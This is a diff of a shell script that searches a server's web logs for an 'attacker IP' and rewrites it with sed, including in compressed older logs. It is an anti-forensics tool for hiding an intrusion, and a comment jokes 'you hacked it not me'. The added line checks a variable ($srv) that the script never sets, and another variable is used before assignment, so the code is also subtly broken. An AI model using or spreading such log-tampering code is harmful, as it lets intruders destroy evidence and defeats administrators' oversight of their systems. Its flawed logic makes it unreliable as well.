@@ -21,6 +21,7 @@ FreeBSD*) number="\$8,\"/\",\$10"
 esac
 echo "Searching for attacker IP: $ip target machine: $os "
 web_srv="`lsof 2>/dev/null -iTCP -sTCP:LISTEN -PN |grep  '*:80\|*:443' 2> /dev/null |awk {' print $1 '}|uniq`" ### if listening port is default everything will be ok, else change it you hacked it not me .
+[ -z $srv ]&& echo -e  "\033[1;31m Web srv not found \033[0m" && exit 
 for line in "`lsof 2>/dev/null| grep $web_srv | grep log  | awk {' print '$number' '} | sort | uniq | sed 's/ //g'`";do 
 [ "`grep -m 1  $ip $line`" ]&& sed 's/'$ip'/'$replace'/g' $line >/tmp/$(basename $line) && mv /tmp/$(basename $line)  $line.$(basename $zp)
 [ -f "$line.*.$zip_type" ]&& echo "old compressed logs found ! " && for zp in  $(ls $line.*.$zip_type) ;do 	
